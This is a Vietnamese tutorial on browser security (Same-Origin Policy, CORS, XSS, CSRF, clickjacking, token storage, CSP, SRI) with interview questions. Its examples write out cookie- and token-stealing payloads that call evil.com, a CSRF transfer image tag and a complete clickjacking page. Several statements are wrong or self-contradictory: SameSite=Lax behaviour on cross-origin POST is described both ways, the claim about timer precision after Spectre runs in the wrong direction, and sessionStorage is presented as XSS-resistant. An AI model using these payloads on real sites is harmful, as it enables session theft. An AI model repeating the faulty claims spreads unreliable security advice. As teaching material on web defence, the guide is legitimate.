# Security Model — Cách Trình Duyệt Bảo Vệ Người Dùng

## Câu hỏi mở đầu

```javascript
// Tại sao code này chạy được trên trang của bạn
// nhưng không đọc được localStorage của trang khác?

// Trang A (yoursite.com):
localStorage.setItem('token', 'secret123');
localStorage.getItem('token'); // 'secret123' ✅

// Trang B (malicious.com) — cùng trình duyệt:
localStorage.getItem('token'); // null ✅ — không truy cập được!

// Tại sao? Ai ngăn chặn điều này?
```

**Same-Origin Policy.** Trình duyệt cô lập từng origin (bộ ba: protocol + domain + port). Đây là nền tảng của toàn bộ web security model. Hiểu security model không phải để trở thành security engineer — mà để biết **code của mình đang được bảo vệ như thế nào** và **khi nào mình đang mở cửa cho kẻ tấn công**.

---

## 1. Same-Origin Policy — Nguyên Tắc Nền Tảng

### Origin là gì?

```
Origin = protocol + domain + port

┌────────────┬────────────────────┬────────┬─────────────────────────────────┐
│ URL                       │ Origin │ Same? │ Lý do                          │
├────────────┼────────────────────┼────────┼─────────────────────────────────┤
│ https://a.com/page        │ https://a.com:443 │ ✅  │ hoàn toàn giống            │
│ https://a.com:8443/page   │ https://a.com:443 │ ❌  │ port khác (8443 ≠ 443)    │
│ http://a.com/page         │ https://a.com:443 │ ❌  │ protocol khác              │
│ https://b.com/page        │ https://a.com:443 │ ❌  │ domain khác                │
│ https://sub.a.com/page    │ https://a.com:443 │ ❌  │ subdomain khác             │
└────────────┴────────────────────┴────────┴─────────────────────────────────┘

⚠️ Port: browser implementation không đồng nhất. Chrome coi khác port = khác origin.
        IE coi cùng port = cùng origin. Luôn code theo strict nhất.
```

### Same-Origin Policy bảo vệ cái gì?

```javascript
// Nhờ Same-Origin Policy:

// ✅ Trang A đọc localStorage của A
localStorage.getItem('token'); // hoạt động

// ❌ Trang B (khác origin) đọc localStorage của A
// → Browser BLOCKED — cross-origin access

// ✅ A gọi fetch('/api/data') → A's server
// ❌ A gọi fetch('https://bank.com/transfer') → Browser BLOCKED
// → SOP: cross-origin network request bị blocked

// ✅ A embed iframe B (cùng origin) → truy cập được
// ❌ A embed iframe B (khác origin) → blocked
```

### SOP không áp dụng cho 3 trường hợp này

```javascript
// 1. <script src="..."> — có thể load cross-origin script
// Browser execute script nhưng không đọc được source
<script src="https://cdn.example.com/lib.js"></script>

// 2. <img>, <video>, <link> — có thể embed cross-origin resources
<img src="https://other-site.com/image.png">

// 3. CSS <link> — có thể load cross-origin CSS
<link rel="stylesheet" href="https://other-site.com/style.css">

// → Đây là lý do tại sao <script> injection CỰC KỲ nguy hiểm
// Nếu attacker chèn <script src="evil.com/steal.js">
// → Browser load và EXECUTE nó như code của bạn!
```

---

## 2. CORS — Mở Cửa Có Kiểm Soát

### Vấn đề cơ bản

```
Browser                    Server (api.example.com)
  │                              │
  │  fetch('https://api...')    │
  │ ──── preflight OPTIONS ────► │
  │ ◄─── Access-Control-Allow-Origin:* ──│
  │                              │
  │  GET /data                   │
  │ ──── (actual request) ──────► │
  │ ◄─── 200 OK + data ─────────│
  │                              │
```

```javascript
// Cross-origin fetch bị blocked theo SOP
fetch('https://api.bank.com/balance')
  .then(r => r.json())
  .then(data => console.log(data));
// → Browser: "CORS error! Access denied!"

// Server phải respond với header đúng:
Response.headers.set('Access-Control-Allow-Origin', 'https://mysite.com');
// hoặc '*' cho public APIs (nhưng không dùng '*' cho credentials)

// ❌ * + credentials không được cùng lúc
'Access-Control-Allow-Origin: *' + 'Access-Control-Allow-Credentials: true'
// → Vi phạm! Browser từ chối.
```

### Preflight request

```javascript
// "Simple requests" (GET/POST với certain content-types)
// → Gửi thẳng request, không preflight

// "Non-simple requests" (PUT, DELETE, custom headers, etc.)
// → Browser gửi OPTIONS preflight TRƯỚC
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ name: 'Alice' })
});
// Browser gửi OPTIONS preflight:
// OPTIONS /data
// Access-Control-Request-Method: PUT
// Access-Control-Request-Headers: content-type, x-custom-header
// Server phải respond:
// Access-Control-Allow-Methods: PUT
// Access-Control-Allow-Headers: content-type, x-custom-header
```

### CORS với Credentials

```javascript
// Server response phải include:
// Access-Control-Allow-Credentials: true
// Access-Control-Allow-Origin: https://your-site.com (KHÔNG dùng *)

fetch('https://api.example.com/profile', {
  credentials: 'include'  // gửi cookies
});

// ❌ Sai: dùng credentials + origin: *
// ✅ Đúng: server phải echo lại exact origin
```

---

## 3. XSS — Cross-Site Scripting

### XSS là gì?

XSS xảy ra khi attacker **chèn executable JavaScript vào trang của bạn** và trình duyệt execute nó như code hợp lệ.

### Ba loại XSS

```
┌─────────────────────────────────────────────────────────┐
│  XSS TYPES                                                │
│                                                           │
│  1. Reflected XSS — payload trong URL, server reflect   │
│     GET /search?q=<script>alert(1)</script>              │
│     → Server reflect vào HTML → Browser execute!         │
│                                                           │
│  2. Stored XSS — payload lưu trên server (database)     │
│     Comment: "<script>stealCookies()</script>"           │
│     → Lưu vào DB → Gửi cho TẤT CẢ users → Execute!       │
│                                                           │
│  3. DOM-based XSS — JS đọc URL và ghi vào DOM          │
│     URL: /page?name=<img src=x onerror=alert(1)>        │
│     → document.write(name) → execute!                    │
└─────────────────────────────────────────────────────────┘
```

### Reflected XSS

```javascript
// Server code (Node.js):
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ❌ Reflected XSS: ghi thẳng user input vào HTML
  res.send(`<h1>Kết quả cho: ${query}</h1>`);
  // Input: ?q=<script>document.location='evil.com?c='+doc</script>
  // → Script được reflect → execute!
});

// ✅ Safe: escape HTML
import escapeHtml from 'escape-html';
app.get('/search', (req, res) => {
  res.send(`<h1>Kết quả cho: ${escapeHtml(req.query.q)}</h1>`);
});
```

### Stored XSS

```javascript
// Comment form:
<textarea id="comment">Tôi thích sản phẩm này!</textarea>
<button onclick="submitComment()">Gửi</button>

// ❌ Server lưu raw HTML vào DB
// Attacker gửi: <script>fetch('evil.com?c='+document.cookie)</script>
// → Script lưu vào DB → MỌI user xem comment → Script execute
// → Attacker đọc được cookies của mọi người!

// ✅ Safe: sanitize server-side
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(userInput);
// <script> → removed, <b> → kept
```

### DOM-based XSS

```javascript
// ❌ URL parameter được ghi vào DOM không sanitize
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.write(`<h1>Xin chào, ${name}</h1>`);
// URL: ?name=<img src=x onerror=alert(document.cookie)>
// → document.write nhận HTML, browser parse và execute!

// ✅ Safe: dùng textContent
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
const h1 = document.createElement('h1');
h1.textContent = `Xin chào, ${name}`; // không parse HTML
document.body.appendChild(h1);
```

### CSP — Content Security Policy

```html
<!-- CSP: whitelist nơi browser có thể load resources -->
<!-- Từ đó ngăn cản inline script injection -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://trusted-cdn.com;
               style-src 'self' 'unsafe-inline';
               img-src 'self' https: data:;
               connect-src 'self' https://api.example.com;
               frame-ancestors 'none';">

<!-- Từ server-side header (tốt hơn): -->
<!-- Content-Security-Policy: script-src 'self' -->
```

```javascript
// CSP ngăn cản:
// ❌ Inline scripts
<script>alert(1)</script>           // BLOCKED
<script src="evil.com/xss.js"></script> // BLOCKED (nếu không whitelist)

// ✅ External scripts phải từ whitelist
<script src="https://trusted-cdn.com/lib.js"></script> // ALLOWED

// ⚠️ 'unsafe-inline' cho phép inline script → PHÁ VỠ CSP
// ⚠️ 'unsafe-eval' cho phép eval() → PHÁ VỠ CSP
```

---

## 4. CSRF — Cross-Site Request Forgery

### CSRF là gì?

```javascript
// Người dùng đã login vào bank.com
// Attacker gửi email với link đến evil.com

// evil.com có code:
<img src="https://bank.com/transfer?to=attacker&amount=10000">

// Trình duyệt gửi request đến bank.com
// Browser auto-include bank.com cookies!
// → bank.com nhận: GET /transfer?to=attacker&amount=10000
// → Bank: "Có cookie hợp lệ, xử lý transfer!"
// → Mất tiền! ⚠️
```

### Anti-CSRF Token

```javascript
// Server tạo CSRF token khi session bắt đầu:
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Client gửi form:
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="{{csrfToken}}">
  <button type="submit">Transfer</button>
</form>

// Hoặc header:
fetch('/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken  // ← CSRF token
  },
  body: new URLSearchParams({ to: 'attacker', amount: 10000 })
});

// Server kiểm tra:
// ❌ Không có token → 403 Forbidden
// ❌ Token không khớp → 403 Forbidden
// ✅ Token khớp → xử lý request
```

### SameSite Cookie — Giải pháp hiện đại

```javascript
// SameSite cookie attribute:
Set-Cookie: sessionId=abc123; SameSite=Strict
// → Cookie CHỈ được gửi cho requests CÙNG origin
// → evil.com không gửi được cookie của bank.com!

Set-Cookie: sessionId=abc123; SameSite=Lax
// → Default trong modern browsers
// → Cookie gửi cho GET top-level navigations
// → Không gửi cho POST requests từ cross-origin

Set-Cookie: sessionId=abc123; SameSite=None; Secure
// → Cookie gửi cho TẤT CẢ cross-origin requests
// → Phải có Secure (HTTPS only)

// ✅ Best practice:
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly
```

---

## 5. Clickjacking

### Clickjacking là gì?

```html
<!-- Attacker tạo trang với iframe ẩn chứa button của victim site -->
<!-- User nghĩ đang click button của trang attacker -->
<!-- Thực ra click vào button của trang victim! -->

<!DOCTYPE html>
<html>
<head>
  <style>
    /* Ẩn iframe phía dưới */
    iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0;
      /* Hoặc dùng: z-index và gradient overlay */
    }
    button { position: relative; z-index: 1; }
  </style>
</head>
<body>
  <!-- Fake button -->
  <button>Click me to win iPhone!</button>

  <!-- Invisible iframe -->
  <iframe src="https://bank.com/send?to=attacker&amount=10000">
  </iframe>
</body>
</html>
```

### X-Frame-Options — Ngăn Clickjacking

```javascript
// Server headers:
res.setHeader('X-Frame-Options', 'DENY');           // Hoàn toàn không cho embed
res.setHeader('X-Frame-Options', 'SAMEORIGIN');      // Chỉ cho embed cùng origin
res.setHeader('X-Frame-Options', 'ALLOW-FROM https://allowed-site.com');

// Hoặc CSP:
res.setHeader('Content-Security-Policy', 'frame-ancestors \'none\'');
res.setHeader('Content-Security-Policy', 'frame-ancestors \'self\'');

// ✅ Modern CSP override X-Frame-Options (nếu có cả 2, CSP thắng)
```

---

## 6. Web Storage Security

### So sánh security của các storage

```javascript
// localStorage / sessionStorage:
// ✅ Cùng origin = truy cập được
// ✅ KHÔNG gửi tự động trong HTTP requests (khác với cookies)
// ❌ Sensitive data vẫn có thể bị XSS đọc

// Cookies:
// ✅ Có HttpOnly flag → JS không đọc được → bảo vệ against XSS steal
// ✅ Có SameSite → bảo vệ against CSRF
// ✅ Có Secure → chỉ gửi qua HTTPS
// ❌ Vẫn gửi tự động trong mọi request đến domain

// IndexedDB:
// ✅ Cùng origin = truy cập được
// ✅ Dữ liệu phức tạp hơn
// ❌ Không có built-in encryption
```

### Lưu token đúng cách

```javascript
// ❌ KHÔNG BAO GIỜ lưu sensitive data trong localStorage
// XSS attack đọc localStorage dễ dàng:
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token); // Stealed!

// ✅ BEST: HttpOnly Cookie (server-side session)
// → JS không bao giờ đọc được token
// → Browser tự động gửi cookie (CSRF protection với SameSite)
// → HttpOnly ngăn XSS đọc cookie

// ✅ GOOD: SessionStorage + HTTPS
// → XSS không đọc được nếu attacker không có code injection
// → Đóng tab = mất session

// ✅ If must use localStorage:
sessionStorage.setItem('token', token); // không persist khi đóng tab
// Luôn dùng HTTPS để tránh man-in-the-middle
```

---

## 7. Iframe Security

### Sandboxed iframe

```html
<!-- ❌ iframe không sandbox = có thể access parent -->
<iframe src="https://external-site.com">
  → access parent.document → SOP violation (nếu khác origin)
  → Nhưng nếu cùng origin: có thể đọc parent!
</iframe>

<!-- ✅ iframe sandbox — giới hạn capabilities -->
<iframe src="https://external-site.com"
        sandbox="allow-scripts">
  <!-- allow-scripts: được chạy scripts (nhưng không access parent)
       allow-forms: được submit forms
       allow-same-origin: coi như same-origin (NGUY HIỂM!)
       allow-popups: được mở popup
       (nothing): sandboxed hoàn toàn, không gì cả -->
</iframe>

<!-- ✅ Best practice: sandbox không có allow-same-origin -->
<iframe src="https://external-site.com"
        sandbox="allow-scripts allow-forms">
  <!-- KHÔNG có allow-same-origin
       → Luôn treated như cross-origin
       → SOP bảo vệ hoàn toàn -->
</iframe>
```

### postMessage — Giao tiếp iframe an toàn

```javascript
// Parent gửi message đến iframe:
const iframe = document.querySelector('iframe');
iframe.contentWindow.postMessage(
  { type: 'AUTH', token: 'abc123' },
  'https://trusted-site.com'  // ✅ Chỉ gửi đến intended origin
);

// ❌ KHÔNG dùng '*' — gửi đến MỌI origin
iframe.contentWindow.postMessage({ data: 'test' }, '*');

// Iframe nhận message:
window.addEventListener('message', (event) => {
  // ✅ LUÔN kiểm tra origin trước
  if (event.origin !== 'https://parent-site.com') {
    return; // Ignore messages from untrusted origins
  }

  // ✅ Kiểm tra message structure
  if (event.data.type === 'AUTH') {
    handleAuth(event.data.token);
  }
});
```

---

## 8. Các Traps Phổ Biến

### Trap 1: InnerHTML — cửa ngõ XSS

```javascript
// ❌ XSS disaster
const userComment = '<img src=x onerror="stealCookies()">';
el.innerHTML = userComment; // → Execute!

// ✅ Safe approaches:
el.textContent = userComment;              // 1. textContent
const img = document.createElement('img');  // 2. createElement
img.src = sanitizeUrl(userUrl);             // 3. sanitize + createElement
el.appendChild(img);
```

### Trap 2: URL params không sanitize khi ghi vào DOM

```javascript
// ❌ DOM XSS
const name = new URLSearchParams(location.search).get('name');
document.write(`<h1>${name}</h1>`); // XSS!

// ✅ Safe
const name = new URLSearchParams(location.search).get('name');
const h1 = document.createElement('h1');
h1.textContent = name; // ✅
document.body.appendChild(h1);

// ✅ Hoặc dùng template literal với sanitization
import DOMPurify from 'dompurify';
document.body.innerHTML = DOMPurify.sanitize(`<h1>${name}</h1>`);
```

### Trap 3: CORS origin whitelist bằng wildcard

```javascript
// ❌ Cực kỳ nguy hiểm
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // MỌI origin!
  next();
});

// ✅ Đúng cách
app.use((req, res, next) => {
  const allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    // ❌ KHÔNG BAO GIỜ dùng '*' khi có credentials
  }
  next();
});
```

### Trap 4: SameSite=Lax không đủ cho sensitive operations

```javascript
// SameSite=Lax ngăn CSRF cho GET requests
// nhưng POST requests từ cross-origin vẫn được gửi!

// <form action="https://bank.com/transfer" method="POST">
// → Browser gửi cookie SameSite=Lax! → CSRF vẫn xảy ra!

// ✅ Luôn dùng CSRF token cho sensitive POST/PUT/DELETE
```

### Trap 5: JWT trong localStorage

```javascript
// ❌ localStorage không an toàn với JWT sensitive
localStorage.setItem('jwt', response.token);
// XSS: attacker chèn <script>window.location='evil.com?c='+localStorage.jwt

// ✅ HttpOnly Cookie là best practice cho JWT
// Server set: Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Lax
// → JS không đọc được → XSS không steal được

// ✅ If must use localStorage:
// 1. Dùng short-lived tokens
// 2. Implement CSRF protection
// 3. Dùng iframe sandboxing cho sensitive sections
```

---

## 9. Câu Hỏi Phỏng Vấn

### Câu 1: Same-Origin Policy bảo vệ gì?

**Trả lời:** SOP giới hạn cách document/window từ origin A tương tác với resource từ origin B. Cụ thể: ngăn cross-origin DOM access, ngăn cross-origin fetch/XMLHttpRequest, ngăn access cookies từ domain khác. SOP **không** ngăn `<script>` hay `<img>` embed (vì không đọc được content), nhưng đây chính là khe hở XSS khai thác.

---

### Câu 2: CSP hoạt động như thế nào?

**Trả lời:** CSP là HTTP header hoặc `<meta>` tag whitelist resources. Browser chỉ load/execute resources từ whitelist. `script-src 'self'` → chỉ load script từ cùng origin. `script-src 'nonce-abc123'` → chỉ execute script với matching nonce. CSP ngăn cả hầu hết XSS (inline script injection) vì attacker không thể inject script không có valid nonce/hash.

---

### Câu 3: CSRF vs XSS khác nhau thế nào?

| | XSS | CSRF |
|--|-----|------|
| Bản chất | Inject script vào trang victim | Forge request từ trình duyệt victim |
| Cần gì? | Victim execute attacker script | Victim có active session |
| Cookie bị đánh cắp? | Có thể (nếu không HttpOnly) | Không đọc được, nhưng browser tự gửi |
| Phòng chống | CSP, sanitize input, HttpOnly cookie | CSRF token, SameSite cookie |
| Ví dụ | `<script>stealCookies()</script>` | `fetch('bank.com/transfer')` auto-sends cookie |

---

### Câu 4: HttpOnly cookie vs localStorage

**Trả lời:** HttpOnly cookie không thể đọc bằng JavaScript (phòng XSS steal), browser tự động gửi trong requests, có thể dùng SameSite. localStorage có thể đọc bằng JS (dễ bị XSS), không tự động gửi (phải tự thêm vào headers), persist vĩnh viễn. Best practice: sensitive tokens → HttpOnly cookie. Non-sensitive data → localStorage.

---

### Câu 5: preflight request là gì?

**Trả lời:** Browser gửi OPTIONS request trước "non-simple" requests (PUT/DELETE, custom headers, non-standard content-types) để hỏi server có chấp nhận không. Server respond với CORS headers (Access-Control-Allow-*). Nếu server không respond đúng → browser block actual request. GET/POST simple requests không có preflight.

---

### Câu 6: X-XSS-Protection header có còn cần thiết?

**Trả lời:** Header này kích hoạt XSS auditor của browser (Chrome đã bỏ từ v77). Đã lỗi thời. Thay vào đó: dùng CSP (hiệu quả hơn nhiều), sanitize inputs, use textContent instead of innerHTML, HttpOnly cookies.

---

### Câu 7: Subresource Integrity (SRI) là gì?

```html
<!-- ⚠️ CDN bị compromise → attacker thay đổi library -->
<!-- → toàn bộ users execute attacker code! -->

<!-- ✅ SRI: verify file hash -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-oqVuAfXRKap..."
        crossorigin="anonymous">
</script>

<!-- Browser:
  1. Download lib.js
  2. Compute SHA-384 hash
  3. So sánh với integrity attribute
  4. Nếu khác → không execute!
-->
```

**Trả lời:** SRI cho phép verify external resources (scripts, stylesheets) không bị modify. Dùng hash (SHA-384 hoặc SHA-512) trong `integrity` attribute. Browser compute hash và reject nếu không match. Essential khi load từ third-party CDNs.

---

### Câu 8: Spectre và Meltdown ảnh hưởng đến browser thế nào?

```javascript
// Spectre: CPU vulnerability cho phép speculative execution
// đọc memory của process khác

// Browser mitigations:
{
  // 1. Site Isolation — mỗi origin = process riêng
  // Chrome: about:flags → Site Isolation enabled by default

  // 2. Cross-Origin Read Blocking (CORB)
  // Browser block cross-origin JSON responses being
  // interpreted as HTML/JS/Script

  // 3. Sec- prefixed headers (breaking changes)
  // Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest
}
```

**Trả lời:** Spectre/Meltdown cho phép JS đọc memory của process khác. Browser mitigations: Site Isolation (mỗi origin = process riêng), CORB (block cross-origin reads), reduced timer precision. Năm 2018, browsers giảm `performance.now()` precision từ 5μs xuống 2μs để hạn chế timing attacks.

---

### Câu 9: Feature-Policy / Permissions-Policy là gì?

```html
<!-- Feature-Policy (đổi tên thành Permissions-Policy) -->
<!-- Cho phép/từ chối feature cho page và iframes -->

<!-- ❌ Disable camera trên toàn bộ page -->
<iframe src="https://trusted-partner.com"
        allow="camera 'none'">

<!-- ✅ Chỉ allow camera trong specific iframe -->
<iframe src="video-call.html"
        allow="camera 'self'; microphone 'self'">

<!-- ✅ Disable geolocation cho toàn bộ page -->
<meta http-equiv="Permissions-Policy"
      content="geolocation=(), camera=(), microphone=()">

<!-- ✅ Server-side header (recommended) -->
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**Trả lời:** Permissions-Policy kiểm soát feature nào page/iframes được phép sử dụng. Ngăn third-party iframes lạm dụng camera, microphone, geolocation. Đặt policy ở HTTP header (recommended) thay vì `<meta>` để apply trước khi HTML parsed.

---

### Câu 10: Escape HTML vs Sanitize khác nhau?

```javascript
// Escape: chuyển special characters → HTML entities
// Input: <script>alert(1)</script>
// Output: &lt;script&gt;alert(1)&lt;/script&gt;
// → Browser hiển thị text, không execute

escapeHtml('<script>'); // '&lt;script&gt;'

// Sanitize: loại bỏ dangerous tags/attributes, giữ lại safe HTML
// Input: '<p>Hello</p><script>alert(1)</script><img src=x onerror=alert(2)>'
// Output: '<p>Hello</p><img src="x">'
// → Giữ formatting nhưng remove XSS vectors

DOMPurify.sanitize(input, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'br'],
  ALLOWED_ATTR: ['href'] // chỉ allow href trong attributes
});

// ✅ Dùng khi: cần render safe HTML (rich text editor → preview)
// ✅ Dùng khi: text content → dùng escape hoặc textContent
```

**Trả lời:** Escape chuyển ký tự đặc biệt thành entities, hiển thị như text. Sanitize loại bỏ dangerous HTML tags/attributes nhưng giữ lại safe HTML. Luôn prefer escaping hoặc `textContent` khi có thể. Chỉ dùng sanitize khi cần render rich HTML.

---

## 10. Tổng Hợp

```
┌──────────────────────────────────────────────────────────────┐
│  BROWSER SECURITY MODEL                                         │
│                                                               │
│  SAME-ORIGIN POLICY (SOP)                                      │
│  protocol + domain + port → isolation boundary                │
│  ├── Block: cross-origin DOM access                          │
│  ├── Block: cross-origin fetch/XHR                           │
│  ├── Allow: <script>, <img>, <link> (can't read content)      │
│                                                               │
│  CORS — Mở Có Kiểm Soát                                       │
│  ├── Access-Control-Allow-Origin: whitelisted origins         │
│  ├── Preflight OPTIONS for non-simple requests               │
│  ├── Never use '*' + credentials                              │
│                                                               │
│  XSS — Inject Script                                          │
│  ├── Reflected: URL → server → HTML                         │
│  ├── Stored: database → every user                           │
│  ├── DOM-based: JS reads URL → writes DOM                   │
│  ├── Prevention: CSP, sanitize, textContent, HttpOnly       │
│                                                               │
│  CSRF — Forge Request                                          │
│  ├── Browser auto-sends cookies → forged request succeeds   │
│  ├── Prevention: CSRF token, SameSite cookie                │
│                                                               │
│  DEFENSE IN DEPTH                                              │
│  ├── CSP: whitelist resources                                 │
│  ├── HttpOnly cookie: JS can't read token                    │
│  ├── SameSite: cookie không gửi cross-origin                 │
│  ├── X-Frame-Options: ngăn clickjacking                     │
│  ├── SRI: verify CDN file integrity                          │
│  ├── Permissions-Policy: disable unused features            │
│                                                               │
│  ⚠️ XSS = CO[ dangerous nhất, phá vỡ tất cả defenses      │
│  ⚠️ InnerHTML = cửa ngõ XSS                                 │
│  ⚠️ localStorage cho token = XSS steal target              │
└──────────────────────────────────────────────────────────────┘
```

---

## 11. Mối Liên Hệ

```
Security Model
  ├── Module (06)       ← ESM sandboxing, import restrictions
  ├── Event Loop (03)   ← async attack vectors, preflight timing
  ├── DOM API (002)     ← innerHTML XSS, CSP interaction
  ├── Performance (09)  ← Spectre mitigations, timer precision
  └── System Design (10) ← auth architecture, token storage
```

---

## Checklist

- [ ] Giải thích được Same-Origin Policy bằng lời
- [ ] Phân biệt được Reflected/Stored/DOM-based XSS
- [ ] Biết cách prevent XSS: textContent, sanitize, CSP
- [ ] Hiểu CSRF mechanism và cách ngăn chặn (token + SameSite)
- [ ] Biết dùng CORS headers đúng cách
- [ ] Hiểu HttpOnly vs localStorage security tradeoffs
- [ ] Trả lời được 8/10 câu hỏi phỏng vấn

---

*Last updated: 2026-04-01*
